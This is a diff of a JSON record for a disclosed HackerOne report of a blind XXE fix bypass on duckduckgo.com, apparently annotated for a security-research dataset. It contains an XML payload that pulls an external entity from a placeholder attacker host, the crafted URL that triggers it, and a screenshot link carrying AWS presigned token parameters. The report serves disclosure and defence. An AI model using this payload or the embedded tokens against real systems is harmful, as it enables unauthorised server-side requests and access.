@@ -1,44 +1,48 @@
 {
-    "reported_to": "DuckDuckGo",
-    "reported_by": "mik317 ",
-    "title": "Partial bypass of #483774 with Blind XXE on https://duckduckgo.com",
-    "content": "\nSummary:\nHi DuckDuckGo team,\nI've contacted previously you because in a second time (on the #483774 report), I've seen that was possible bypass the fix. Anyway, I've not got any response, and because I think that this is a bit dangerous issue, I'm opening another report for the bypass. Hope you'll agree.\nSteps for reproduction:\nAttacker creates a public server and hosts a file with the following content:\nCode 112 Bytes\n1<?xml version=\"1.0\" ?>\n2<!DOCTYPE root [\n3<!ENTITY % ext SYSTEM \"http://attacker_host/Blind_xxe\"> %ext;\n4]>\n5<r></r>\nUser goes on https://duckduckgo.com/x.js?u=http://attacker_host/xxe.xml\n<image_0>\nI'd like to say that this affects not only duckduckgo.com, but also api.duckduckgo.com. Anyway, the #483908 report is still in the triaged state, so I think that will not be right against you submit another report also for the api.duckduckgo.com domain.\nImpact\nBlind XXE leads to dos and blind injection.\n\n",
-    "severity": [
-        7.0,
-        8.9
+  "reported_to": "DuckDuckGo",
+  "reported_by": "mik317 ",
+  "title": "Partial bypass of #483774 with Blind XXE on https://duckduckgo.com",
+  "content": "\nSummary:\nHi DuckDuckGo team,\nI've contacted previously you because in a second time (on the #483774 report), I've seen that was possible bypass the fix. Anyway, I've not got any response, and because I think that this is a bit dangerous issue, I'm opening another report for the bypass. Hope you'll agree.\nSteps for reproduction:\nAttacker creates a public server and hosts a file with the following content:\nCode 112 Bytes\n1<?xml version=\"1.0\" ?>\n2<!DOCTYPE root [\n3<!ENTITY % ext SYSTEM \"http://attacker_host/Blind_xxe\"> %ext;\n4]>\n5<r></r>\nUser goes on https://duckduckgo.com/x.js?u=http://attacker_host/xxe.xml\n<image_0>\nI'd like to say that this affects not only duckduckgo.com, but also api.duckduckgo.com. Anyway, the #483908 report is still in the triaged state, so I think that will not be right against you submit another report also for the api.duckduckgo.com domain.\nImpact\nBlind XXE leads to dos and blind injection.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "XML External Entities (XXE)"
+  ],
+  "screenshots": {
+    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/413/045/a178d3370c409f1fe5b815ccd5e7e89fcc763dd2/xxe.png?response-content-disposition=attachment%3B%20filename%3D%22xxe.png%22%3B%20filename%2A%3DUTF-8%27%27xxe.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZCH4M7MR%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T150458Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDTpRnpgGxF1YzOXY19Dh8r3rvQyJAFAUBJsw0IuBWwwgIhALKrUaAZHvyyGVPXrugSCWikODbvn6oRzP3Eyu9uGZrhKrEFCCwQAxoMMDEzNjE5Mjc0ODQ5IgwU6Q8gns5u2qYmOQ8qjgXGnMo8Ffuybj8d%2F3WjPPhQ7YYShzAGIvWHdKInRBuWTTQvEmQfEPhPWD9QA7457g6F%2BVZViX6oZIiMEHPMY%2FdQqX92IWCt9CRnZ%2FxrVSCBZ2%2F%2Fs3csIyr08GeOnT7jkVAhajm9NmDNRt9RkU31sfCA36FZAG390JWaFsFJW6OBQCZO4OZjYHmo658mLGRJ6hffGwQnFwriS0iLtsVUI0lwdd7jAdaMD2INEr199laUrpvIUNPoBDNYJAszRKihMCIARnLEylwG5EUJkuVNSe3l%2B9WSR9Wd8DD3dNx9JuBNXttIiS2Plig5MCmf6LTJVsB9K2Aqnvp9VxtTEYgwtfpIrX%2B1doSVIId9Pk6Q6aJOR8Py5lBIlCIFodeFgKDqgejyuCSEVh8TN2rOC2krp28ZXE1KmndafT%2BqRzmXLLV4spuJcUC4EMVRF64gRP%2BwBOuvNw%2BmQ8PMSSuavcoMK%2BVW4uImtSbEKMqxsKw2W2qrnk1z%2BN9benr9uXosZGWLmXR1T1RR7l4GvUWQuCRN6PEOuraUpILHkzvydnBMIIz9WlyLD5kZ9WIHUjD8A8204wqEfmPHI%2B3VQopLaB5NMikbOJUQqhcCzbV8YOxhvL89LR6xQysGr33Rc5tqOVRVEUIVgU3wznYMkFr1xlBWqLZHAC5hujj5N8Cp%2F%2B9pio%2FOlAp0j8UOgGDjPUmbLQ9oIII93YQFNRfknCPoyLg%2Bg0TpNQtvAv1WrAICwiInhILUy0BKSqNQysTjGCNf1BAtiBMZu13vmX4EIyn8ufMD9HQfkCzJy3m%2FpkvfOFa5BimgfroXFFvLVVlehL7VKFSBfSibdJzHnDccQEGoeB6oLfsk4TSOhZzAcu9nkHZGusQw5a2PvwY6sAHJ2wRExEmAiTDRxCysMpmZdDOD7w5Y1FzMz7lDofO8NyH0y6MdiADzSxioIZoQfb95vQMw1uguv%2BLQjwJviLMbXeFBqu5MFCaDCNyp7jVe9O3mZ4Ke8XEl%2BOOHJq0dmjW%2F5Kh4i3u7Lr6ZDgKkiAHoFbFaXcJi%2BupSAqhwot1cljAOLpKni3WYeirhEAcmyKgbcq7YO08EGTyfawZBITx%2BDRxlb8ARRRft7QEqHLOVQw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5bd8fb7948a5bd07d5b1bd3d256fcf0b571f593ccf3d03ad15ce6cbc736e2a10"
+  },
+  "disclosed_date": 1551130920,
+  "report_url": "https://hackerone.com/reports/486732",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Attacker sets up a public server hosting a malicious XML file with an external entity reference."
     ],
-    "bounty": null,
-    "weaknesses": [
-        "XML External Entities (XXE)"
-    ],
-    "screenshots": {
-        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/413/045/a178d3370c409f1fe5b815ccd5e7e89fcc763dd2/xxe.png?response-content-disposition=attachment%3B%20filename%3D%22xxe.png%22%3B%20filename%2A%3DUTF-8%27%27xxe.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQZCH4M7MR%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T150458Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEMP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDTpRnpgGxF1YzOXY19Dh8r3rvQyJAFAUBJsw0IuBWwwgIhALKrUaAZHvyyGVPXrugSCWikODbvn6oRzP3Eyu9uGZrhKrEFCCwQAxoMMDEzNjE5Mjc0ODQ5IgwU6Q8gns5u2qYmOQ8qjgXGnMo8Ffuybj8d%2F3WjPPhQ7YYShzAGIvWHdKInRBuWTTQvEmQfEPhPWD9QA7457g6F%2BVZViX6oZIiMEHPMY%2FdQqX92IWCt9CRnZ%2FxrVSCBZ2%2F%2Fs3csIyr08GeOnT7jkVAhajm9NmDNRt9RkU31sfCA36FZAG390JWaFsFJW6OBQCZO4OZjYHmo658mLGRJ6hffGwQnFwriS0iLtsVUI0lwdd7jAdaMD2INEr199laUrpvIUNPoBDNYJAszRKihMCIARnLEylwG5EUJkuVNSe3l%2B9WSR9Wd8DD3dNx9JuBNXttIiS2Plig5MCmf6LTJVsB9K2Aqnvp9VxtTEYgwtfpIrX%2B1doSVIId9Pk6Q6aJOR8Py5lBIlCIFodeFgKDqgejyuCSEVh8TN2rOC2krp28ZXE1KmndafT%2BqRzmXLLV4spuJcUC4EMVRF64gRP%2BwBOuvNw%2BmQ8PMSSuavcoMK%2BVW4uImtSbEKMqxsKw2W2qrnk1z%2BN9benr9uXosZGWLmXR1T1RR7l4GvUWQuCRN6PEOuraUpILHkzvydnBMIIz9WlyLD5kZ9WIHUjD8A8204wqEfmPHI%2B3VQopLaB5NMikbOJUQqhcCzbV8YOxhvL89LR6xQysGr33Rc5tqOVRVEUIVgU3wznYMkFr1xlBWqLZHAC5hujj5N8Cp%2F%2B9pio%2FOlAp0j8UOgGDjPUmbLQ9oIII93YQFNRfknCPoyLg%2Bg0TpNQtvAv1WrAICwiInhILUy0BKSqNQysTjGCNf1BAtiBMZu13vmX4EIyn8ufMD9HQfkCzJy3m%2FpkvfOFa5BimgfroXFFvLVVlehL7VKFSBfSibdJzHnDccQEGoeB6oLfsk4TSOhZzAcu9nkHZGusQw5a2PvwY6sAHJ2wRExEmAiTDRxCysMpmZdDOD7w5Y1FzMz7lDofO8NyH0y6MdiADzSxioIZoQfb95vQMw1uguv%2BLQjwJviLMbXeFBqu5MFCaDCNyp7jVe9O3mZ4Ke8XEl%2BOOHJq0dmjW%2F5Kh4i3u7Lr6ZDgKkiAHoFbFaXcJi%2BupSAqhwot1cljAOLpKni3WYeirhEAcmyKgbcq7YO08EGTyfawZBITx%2BDRxlb8ARRRft7QEqHLOVQw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5bd8fb7948a5bd07d5b1bd3d256fcf0b571f593ccf3d03ad15ce6cbc736e2a10"
-    },
-    "disclosed_date": 1551130920,
-    "report_url": "https://hackerone.com/reports/486732",
-    "is_multi_component": true,
-    "complexity": "HIGH",
-    "novelty": "MEDIUM",
-    "vuln_category": "WEB_APP",
-    "steps": [
-        [
-            1,
-            "Attacker sets up a public server hosting a malicious XML file with an external entity reference."
-        ],
-        [
-            2,
-            "User visits a specially crafted DuckDuckGo URL that references the attacker's XML file."
-        ]
-    ],
-    "vuln_description": "This vulnerability allows for a Blind XXE (XML External Entity) attack on DuckDuckGo's domains, potentially leading to denial of service (DoS) and blind data injection. The attacker can host a malicious XML file that references an external entity, and when a user visits a DuckDuckGo URL that loads this XML, the server processes the external entity, leading to unintended interactions with the attacker's server.",
-    "reason": "The attack involves understanding XXE vulnerabilities and crafting a malicious XML file, but the steps to exploit are straightforward once the vulnerability is identified. The interaction between the XML file and the server's processing is a known attack vector in web security.",
-    "new_complexity": "MEDIUM",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": "#483908",
-    "authnz_metadata": {
-        "reason": "The vulnerability involves Blind XXE which is not directly related to authentication or authorization bypass. The methodology described focuses on testing authorization boundaries by swapping user sessions and resource IDs, which doesn't apply to XXE vulnerabilities that exploit XML parsing behavior.",
-        "is_detectable": false
-    }
+    [
+      2,
+      "User visits a specially crafted DuckDuckGo URL that references the attacker's XML file."
+    ]
+  ],
+  "vuln_description": "This vulnerability allows for a Blind XXE (XML External Entity) attack on DuckDuckGo's domains, potentially leading to denial of service (DoS) and blind data injection. The attacker can host a malicious XML file that references an external entity, and when a user visits a DuckDuckGo URL that loads this XML, the server processes the external entity, leading to unintended interactions with the attacker's server.",
+  "reason": "The attack involves understanding XXE vulnerabilities and crafting a malicious XML file, but the steps to exploit are straightforward once the vulnerability is identified. The interaction between the XML file and the server's processing is a known attack vector in web security.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": "#483908",
+  "authnz_metadata": {
+    "reason": "The Blind XXE vulnerability involves an external XML entity injection, which is not directly related to authentication or authorization bypass. The proposed methodologies focus on testing authorization boundaries by swapping user sessions or resource IDs, which does not apply to XXE vulnerabilities that exploit XML parsing behavior.",
+    "is_detectable": false
+  },
+  "injection_metadata": {
+    "reasoning": "The reported Blind XXE vulnerability requires injecting an external XML entity via the 'u' parameter. The methodology's 'simple payload' approach could theoretically detect XXE if the payload list includes basic external entity declarations. However, the methodology's detection criteria requires payload execution to be observable *within the same channel* (via HTTP response inspection or regular navigation). Blind XXE exfiltration occurs out-of-band (via attacker server callbacks), which violates the 'same channel' detection constraint. Thus, the methodology would not identify this vulnerability unless the payload list explicitly includes OOB XXE payloads and the tester monitors external network channels, which is outside the defined scope.",
+    "is_simple_injection": false
+  }
 }
